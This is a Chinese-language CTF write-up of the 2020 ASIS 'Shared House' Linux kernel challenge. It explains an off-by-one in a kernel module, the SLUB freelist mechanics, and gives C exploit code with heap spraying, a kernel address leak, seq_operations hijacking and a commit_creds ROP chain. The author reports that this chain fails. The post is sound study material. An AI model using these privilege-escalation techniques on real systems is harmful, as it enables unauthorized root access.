---
layout: post
title: 2020 ASIS Shared House Write-up
date: 2020-08-16
Author: LJP-TW
tags: [CTF]
comments: true
toc: true
excerpt_separator: <!--more-->
---

# 前言
這題是我的第一題 kernel pwn, 學到了很多新東西, 用這篇文詳細的紀錄一下過程

感謝 [HexRabbit](https://github.com/HexRabbit) 大大解題過程中的各種解惑 <(\_ \_)> 不然一開始我連 slub 機制都不知道是啥

主要參考了其他 write-up

這篇文除了解釋題目跟紀錄解題過程之外, 還會紀錄跟工具相關的部份, 希望對跟我一樣的新手有幫助 :)

* 如果完全沒寫過 kernel module, 可以先去寫一個簡單的東東來玩看看再回來

<!--more-->

# 題目介紹
題目給了
- bzImage
- rootfs.cpio
- start.sh

是一題 kernel pwn 題, 目的是提權成為 root

start.sh 使用 qemu 模擬出一台機器, bzImage 作為作業系統, rootfs.cpio 作為檔案系統

bzImage 為 linux v4.19.98 kernel:
```
# file bzImage
bzImage: Linux kernel x86 boot executable bzImage, version 4.19.98 (ptr@medium-pwn) #14 SMP Fri Jun 12 15:19:48 JST 2020, RO-rootFS, swap_dev 0x5, Normal VGA
```

有些腳本/程式在 linux 開機後會被執行, 有可能是：
- /sbin/init
- /etc/inittab 上設定的腳本
- ...
(這部份可以參考[鳥哥的文章](http://linux.vbird.org/linux_basic/0510osloader/0510osloader-fc4.php))

所以我們要來看看躺在檔案系統的這些腳本們

# 檔案系統
將檔案系統從 rootfs.cpio 解出來:
```
mkdir rootfs
cd rootfs
sudo cpio -idm < /path/to/rootfs.cpio
sudo chown root:root -R rootfs
```

其中, flag 就是我們要讀的檔案, 只有 root 才能讀

而 /init 從檔名看起來就覺得是剛剛提到的、開機會執行到腳本, 其中重要的部份如下:
```
insmod /root/note.ko
mknod -m 666 /dev/note c `grep note /proc/devices | awk '{print $1;}'` 0

setsid /bin/cttyhack setuidgid 1000 /bin/sh
```

新增了 `note.ko` kernel module

最後給你 uidgid 1000 的 /bin/sh, 要你提權

我們可以先將這行改掉, 讓我們方便寫 exploit:
```
# setsid /bin/cttyhack setuidgid 1000 /bin/sh
/bin/sh # 還是 root 權限
```

把改過的檔案系統包回 cpio:
```
# 在檔案系統目錄底下執行
sudo find . -print | sudo cpio -o -Hnewc > ../my.cpio

# 之後寫 exploit 可以直接
rm -rf ../my.cpio && sudo gcc ../exploit.c -o exploit -lpthread --static && sudo chown 1000:1000 exploit && sudo find . -print | sudo cpio -o -Hnewc > ../my.cpio
```

接著我們來看看 `note.ko`

# Reverse
`note.ko` 的 `module_initialize` 註冊了裝置 `/dev/note`, user 可以和裝置互動 (open/read/write/ioctl), 互動時此 kernel module 就會執行對應的程式碼

`note.ko` 實作了 ioctl:
```c
__int64 __fastcall mod_ioctl(__int64 a1, unsigned int a2, __int64 a3)
{
  unsigned int v4; // [rsp+0h] [rbp-18h]
  __int64 v5; // [rsp+8h] [rbp-10h]

  if ( copy_from_user(&v4, a3, 16LL) )
    return -14LL;
  if ( v4 <= 0x80 )
  {
    mutex_lock(&_mutex);
    if ( a2 == 0xC12ED002 )
    {
      if ( !note )
      {
LABEL_10:
        mutex_unlock(&_mutex);
        return -22LL;
      }
      kfree();
      *(&note + 0x20000000) = 0LL;
    }
    else if ( a2 <= 0xC12ED002 )
    {
      if ( a2 != 0xC12ED001 )
        goto LABEL_10;
      if ( note )
        kfree();
      size = v4;
      note = _kmalloc(v4, 0x6080C0LL);          // ___GFP_IO
                                                // ___GFP_FS
                                                // ___GFP_ZERO
                                                // ___GFP_NOTRACK
                                                // ___GFP_DIRECT_RECLAIM
      if ( !note )
        goto LABEL_10;
    }
    else if ( a2 == 0xC12ED003 )
    {
      if ( !note || v4 > size || copy_from_user(note, v5, v4) )
        goto LABEL_10;
      *(_BYTE *)(note + v4) = 0;
    }
    else if ( a2 != 0xC12ED004 || !note || v4 > size || copy_to_user(v5) )
    {
      goto LABEL_10;
    }
    mutex_unlock(&_mutex);
    return 0LL;
  }
  return -22LL;
}
```

我們可以寫一個簡易的 user program 來與之互動:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int note_fd;

struct info {
   long long int length;
   char *addr;
} args, read_args;

void note_alloc()
{
    ioctl(note_fd, 0xC12ED001, &args);
}

void note_close()
{
    ioctl(note_fd, 0xC12ED002, &args);
}

void note_write()
{
    ioctl(note_fd, 0xC12ED003, &args);
}

void note_read()
{
    ioctl(note_fd, 0xC12ED004, &read_args);
}

void init()
{
    int size = 0x10;
    note_fd = open("/dev/note", O_RDWR);

    args.length = size;
    args.addr = malloc(size);

    strcpy(args.addr, "hello :)");

    read_args.length = size;
    read_args.addr = malloc(size);

    memset(read_args.addr, 0, size);
}

int main()
{
    init();

    note_alloc();
    note_write();

    printf("before read:\n");
    if (read_args.addr[0] == 0)
        printf("nan\n");
    else
        printf("%s\n", read_args.addr);

    note_read();

    printf("after read:\n");
    if (read_args.addr[0] == 0)
        printf("nan\n");
    else
        printf("%s\n", read_args.addr);

    note_close();
}
```

編譯並包回 rootfs:
```
rm -rf ../my.cpio && sudo gcc ../exploit.c -o exploit -lpthread --static && sudo chown 1000:1000 exploit && sudo find . -print | sudo cpio -o -Hnewc > ../my.cpio
```

執行 `start.sh` 跑 qemu, 執行結果如下:
```
/ $ ./exploit
before read:
nan
after read:
hello :)
```

好, 以上是正常使用, 所以問題在哪邊？

# Vulnerability

問題就出在有一個 off-by-one:
```c
    else if ( a2 == 0xC12ED003 )
    {
      if ( !note || v4 > size || copy_from_user(note, v5, v4) )
        goto LABEL_10;
      *(_BYTE *)(note + v4) = 0;
    }
```

前面有限制我們只能申請小於 0x80 的 memory, 且是用 kmalloc

其會使用到 linux 的 `slub` 機制

這讓我們能夠改寫下一塊 free object 的 free next ptr, 進而影響到下下次 kmalloc 時分配到的記憶體空間

這邊就要另外講講 slub 的機制了

# slub allocator
linux 記憶體管理機制相當龐大複雜, 這邊筆者也只能簡單說說而已

在 kernel 中, 若你需要使用到很大的記憶體空間, 會以 `buddy system` 分配 pages

而分配小空間就要用到 `slub`

`slub` 跟 `buddy system` 申請 page 後, 會將 page 先切成一格格同 size 的 objects, size 有 0x8, 0x10, 0x20, 0x40, 0x60, 0x80...

(可以用 `sudo cat /proc/slabinfo` 看看 slab 分配的狀態)

每個 free object 前 8 bytes 為 free next ptr, 指向下一個 free object

在頭部有個 freelist 指向第一塊 free object, 下次分配時會先將此 object 的 next ptr 回填到 freelist 後, 在將這塊 object 分配出去

就類似於 heap 的 tcache、fastbin

google 搜尋 `圖解 slub` 能找到一個很讚的圖, 充分表示了各個結構之間的關係

# Exploit
[完整 exploit 連結](https://github.com/LJP-TW/CTF/blob/master/AsisCTF-2020/pwn/shared_house/exploit.c)

計畫如下：
1. 利用 off-by-one, 讓其中一塊 free object 的 next ptr 指向自己
2. 如此, 接下來申請的兩塊記憶體會在同一塊上面
3. 讓 note 與另一個結構疊合
4. 透過讀 note 有機會得到 kernel text, 寫 note 有機會控制到 rip

補充說明：
* 對於 step 1 呢, 由於一個 page 上的 objects 可能有些是正在使用, 有些是 free 的
  * 造成一個 page 坑坑洞洞
  * 解決辦法就是瘋狂申請 object (這個行為叫做 spray)
    * 填滿一頁後, `slub` 又重新拿了一個 page 來切割 object
    * 我們就有一張 「前面都是正在使用的 objects, 後面都是 free objects 」的 page 了～
    * 方便我們執行 off-by-one

* 對於 step 3 呢, 到底要挑什麼結構, 就是最難的部份了 (linux 結構那麼多, 從何下手RRR)
  * 參考 [Kernel Exploitで使える構造体集](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)

## Leak kernel text
首先來構造 off-by-one
```c
    // allocate to a new page
    for (int i = 0; i < 41; ++i) {
        msg_alloc(0x80);
    }

    note_alloc();
```
* 前面 spray 了 41 個 0x80 大小的 object
  * 填滿了一頁, 申請新的一頁
  * 就是這個數量, note 下一塊 object 的 next ptr 會是 0x80 結尾

| address   | content   | comment     |
| --------- | --------- | ----------- |
| 0x?...180 | ????????? | note        |
| 0x?...200 | 0x?...280 | free object |
| 0x?...280 | 0x?...300 | free object |

(不一定是 180 啦, 但總之就是 80 結尾, 1 只是個舉例)

執行 off-by-one
```c
    // off-by-one
    note_write();
```

| address   | content   | comment     |
| --------- | --------- | ----------- |
| 0x?...180 | ????????? | note        |
| 0x?...200 | 0x?...200 | free object (阿 指向自己ㄌ) |
| 0x?...280 | 0x?...300 | free object |

接著我們先移動一下我們的 note 到這塊指向自己的 object
```c
    // move note
    note_close();      // freelist: 0x?...180 --> 0x?...200
    msg_alloc(0x80);   // freelist: 0x?...200 --> 0x?...200
    note_alloc();      // freelist: 0x?...200 --> note 的內容
```

接著, 使用 `socket(22, AF_INET, 0)`, 它會創造出 `subprocess_info` 結構並在結束 function 之前 free 掉
```c
    void *kernel_text;
    unsigned long long int offset;

    socket(22, AF_INET, 0); // 創造 `subprocess_info` 後, return 之前 free 掉
    note_read();            // 把殘留在記憶體上的 `subprocess_info` 內部數據取出

    kernel_text = (void *)(*(unsigned long long int *)(&read_args.addr[0x60]));
    kernel_text -= 0x6bac0;
    offset = (unsigned long long int)kernel_text - 0xffffffff81000000;
```

由於 `subprocess_info` 有幾個 function pointer 元素, 讓我們能夠 leak kernel text

這邊怎麼知道 offset 是 0x6bac0 的呢?
- 若能知道 text 段開頭在哪, 就能知道這 function pointer offset 多少
- 通過在 qemu 機裡面 `cat /proc/kallsyms | grep ' _text'` 就能知道 text 段開頭

## Hijack control flow
目前 leak kernel text 了, 那接著就要試試看怎樣才能控制 rip 了

```c
    // spray
    for (int i = 0; i < 131; ++i) {
        openstat();
    }

    args.length = 0x20;

    note_alloc();

    // off-by-one
    note_write();

    // move note
    note_close(); // note --> target object --> target object
    openstat();   // target object --> target object
    note_alloc(); // target object --> note 的內容 (target object 跟 note 現在是同一塊了)
```
- 一樣先 spray, 弄出一個沒有坑洞的 page, 方便打 off-by-one
- 利用 off-by-one 製造一個 next ptr 指向自己的 free object
- 把 note 移動到這 free object, 且下次申請還是會在這個 object 上
- 這邊利用開啟 `/proc/self/stat` 時, 會創造 `seq_operations` 這個結構 (size 0x20) 的特性

```c
    // allocate seq_operations
    int stat_fd = openstat();

    // rewrite function pointer of seq_operations
    *(void **)(&args.addr[0]) = (void *)xchg_eax_esp;
    note_write();

    // invoke!
    char buf[0x10];
    read(stat_fd, buf, 0x10);
```
- 讓 note 跟 `seq_operations` 疊合
- 改掉 start 這個 function pointer
- 讀取 `/proc/self/stat`, 這個行為會執行 start 所指向的 function
- 成功控制執行流!

可以控制執行流了, 接下來的思路就是
- 執行到 `commit_creds(prepare_kernel_cred(0))` 完成提權
- 回到 user mode, 並執行 /bin/sh
- 這樣就有 root 的 shell 了

剩下的 exploit 就是 ROP 了

# Exploit (Fail)
這邊附上我不知道為什麼失敗的 exploit, 希望有人能解答 QQ
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/socket.h>
#include <pthread.h>
#include <sys/mman.h>

int result;
int msqid;
int fd;

struct message {
    long type;
    char text[0x50];
} msg;

struct info {
    long long int length;
    char *addr;
} args, read_args;

void* race(void *_)
{
    sleep(1);
    socket(22, AF_INET, 0);
    return NULL;
}

void note_alloc()
{
    ioctl(fd, 0xC12ED001, &args);
}

void note_close()
{
    ioctl(fd, 0xC12ED002, &args);
}

void note_write()
{
    ioctl(fd, 0xC12ED003, &args);
}

void note_read()
{
    ioctl(fd, 0xC12ED004, &read_args);
}

void msg_alloc(int size)
{
    if (msgsnd(msqid, (void *)&msg, size - 0x30, IPC_NOWAIT) < 0) {
        printf("msgsnd error\n");
        exit(1);
    }
}

unsigned long user_cs, user_ss, user_eflags, user_sp;
void save_stats() {
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %3\n"
            "pushfq\n"
            "popq %2\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
            :
            : "memory"
    );
}

void *ropchain[0x10000];

void init()
{
    int size = 0x80;

    args.length = size;
    args.addr = malloc(size);
    memset(args.addr, 0x87, 0x8);

    read_args.length = size;
    read_args.addr = malloc(size);

    msg.type = 1;
    memset(msg.text, 'a', 0x10);
}

int nani = 0;

void get_shell()
{
    nani = 1;
    system("/bin/sh");
}

int main()
{
    int msgflg = IPC_CREAT | 0666;
    key_t key = 2234;

    init();

    fd = open("/dev/note", O_RDWR);

    if ((msqid = msgget(key, msgflg)) < 0) {
        exit(1);
    }

    // allocate to a new page
    for (int i = 0; i < 41; ++i) {
        msg_alloc(0x80);
    }

    note_alloc();

    // off-by-one
    note_write();

    // move note
    note_close();
    msg_alloc(0x80);
    note_alloc();

    // leak
    void *kernel_text;
    unsigned long long int offset;

    socket(22, AF_INET, 0);
    note_read();

    kernel_text = (void *)(*(unsigned long long int *)(&read_args.addr[0x60]));
    kernel_text -= 0x6bac0;
    offset = (unsigned long long int)kernel_text - 0xffffffff81000000;

    printf("kernel_text: %p\n", kernel_text);
    printf("offset     : %#08llx\n", offset); 
    printf("main       : %p\n", main);
    printf("ropchain   : %p\n", ropchain);

    msg_alloc(0x80);
    
    // allocate to a new page
    msg_alloc(0x80);
    msg_alloc(0x80);
    note_alloc();

    // off-by-one
    note_write();

    // move note
    note_close();
    msg_alloc(0x80);
    note_alloc();

    // next kmalloc will allocate memory that is same as note at

    printf("save stats\n");
    save_stats();

    void *push_rdi_xxx_pop_rsp = (void *)offset + 0xffffffff8121a154;
    void *pop_rdi_ret    = (void *)offset + 0xffffffff81047823;
    void *mov_rdx_r8     = (void *)offset + 0xffffffff8121a7ab;
    void *mov_rdi_rax    = (void *)offset + 0xffffffff810a296e;
    void *swapgs_pop_rbp = (void *)offset + 0xffffffff8103ef24;
    void *pop_rsp        = (void *)offset + 0xffffffff81036561;
    void *iretq          = (void *)kernel_text + 0x1d5c6;

    void *prepare_kernel_cred = (void *)kernel_text + 0x69e00;
    void *commit_creds        = (void *)kernel_text + 0x69c10;

    printf("push_rdi_xxx_pop_rsp   : %p\n", push_rdi_xxx_pop_rsp); // push rdi ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret

    // memset(args.addr, 0, 0x80);
    
    int rop_start = 0x5000;
    int rop_idx = rop_start;
    
    *(void **)(&args.addr[0])    = (void *)0; // pop r13
    *(void **)(&args.addr[0x8])  = (void *)0; // pop rbp
    *(void **)(&args.addr[0x10]) = pop_rsp;   // ret
    *(void **)(&args.addr[0x18]) = &ropchain[rop_start]; 
    *(void **)(&args.addr[0x58]) = push_rdi_xxx_pop_rsp; // cleanup, hijack rip, do stack pivoting

    ropchain[rop_idx++]  = pop_rdi_ret;
    ropchain[rop_idx++]  = 0;
    ropchain[rop_idx++]  = prepare_kernel_cred;
    ropchain[rop_idx++]  = mov_rdx_r8;   
    ropchain[rop_idx++]  = mov_rdi_rax; // this gadget needs that rdx equals to r8
    ropchain[rop_idx++]  = commit_creds;
    ropchain[rop_idx++]  = swapgs_pop_rbp;
    ropchain[rop_idx++]  = 0;
    ropchain[rop_idx++]  = iretq;
    ropchain[rop_idx++]  = get_shell; // memory crrupted, nani ?!?!
    ropchain[rop_idx++] = (void *)user_cs;
    ropchain[rop_idx++] = (void *)user_eflags;
    ropchain[rop_idx++] = (void *)user_sp;
    ropchain[rop_idx++] = (void *)user_ss;

    printf("sleep 3sec...\n");
    sleep(3);
    printf("go race...\n");

    pthread_t t2;
    pthread_create(&t2, NULL, race, NULL);

    while(1) {
        // note_write();
        ioctl(fd, 0xC12ED003, &args);
    }

    pthread_join(t2, NULL);
}
```
- 能執行到 `get_shell()`, 只是接著就說 memory crrupted 了 QQ

# Debug with gdb
gdb plugin 我是使用 gef (而不是 peda, 它 remote debug 好像會怪怪的), 找一下 gef github 就知道怎裝了

在你的 start.sh 裡面修改一下, 替 qemu 多加 `-gdb tcp::6666` 參數, 讓你的 gdb 能夠連進去

接著運行 start.sh 後, gdb 這邊下
```
set architecture i386:x86-64
gef-remote -q localhost:6666
```

或是你也可以在 ~/.gdbinit 新增
```
define qemu
    set architecture i386:x86-64
    gef-remote -q localhost:6666
end
```

這樣下次只要在 gdb 裡面打 qemu 就能連線了

接著應該就會發現, gdb 裡面地址都超大的 (沒錯, 因為你觀察的是 kernel mode)

在 qemu 機中執行 `cat /proc/modules` 可以得到 note.ko 的 base

配合你用的 reverse 工具, 加加減減 offset, 你就能在 note.ko 你感興趣的位置下斷點

當然你也可以通過 `cat /proc/kallsyms | grep "T __kmalloc"` 之類的得到你想下斷點的 function 位置

# Reference
* [鳥哥的 Linux 私房菜 - 開機關機流程與 Loader](http://linux.vbird.org/linux_basic/0510osloader/0510osloader-fc4.php)
* [Kernel Exploitで使える構造体集](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)

